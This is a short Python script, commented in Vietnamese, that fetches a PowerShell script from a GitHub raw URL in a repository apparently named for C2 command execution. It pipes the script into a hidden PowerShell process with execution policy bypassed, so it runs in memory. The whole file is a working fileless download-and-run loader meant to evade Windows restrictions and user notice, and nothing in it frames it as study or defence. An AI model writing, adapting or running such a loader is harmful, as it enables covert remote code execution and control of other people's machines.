import requests
import subprocess
import sys

def execute_in_memory(url):
    try:
        # 1. Tải script PowerShell từ GitHub Raw
        response = requests.get(url)
        if response.status_code != 200:
            print(f"[-] Không thể tải script. Mã lỗi: {response.status_code}")
            return
        
        ps_script = response.text

        # 2. Thực thi PowerShell trực tiếp trong RAM thông qua stdin
        # -ExecutionPolicy Bypass: Bỏ qua các ràng buộc thực thi trên Windows
        # -WindowStyle Hidden: Chạy ẩn (nếu muốn agent không hiện cửa sổ)
        # -Command -: Đọc lệnh từ luồng dữ liệu (stdin)
        process = subprocess.Popen(
            ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", "-"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            encoding='utf-8'
        )

        # Đẩy mã script vào tiến trình và đợi kết quả
        stdout, stderr = process.communicate(input=ps_script)

        if stdout:
            print(f"[+] Kết quả:\n{stdout}")
        if stderr:
            print(f"[-] Lỗi phát sinh:\n{stderr}")

    except Exception as e:
        print(f"[-] Đã xảy ra lỗi hệ thống: {e}")

if __name__ == "__main__":
    # Link GitHub của bạn
    GITHUB_RAW_URL = "https://raw.githubusercontent.com/thedarkassasin/Agent_C2_command_exec/main/ps.txt"
    execute_in_memory(GITHUB_RAW_URL)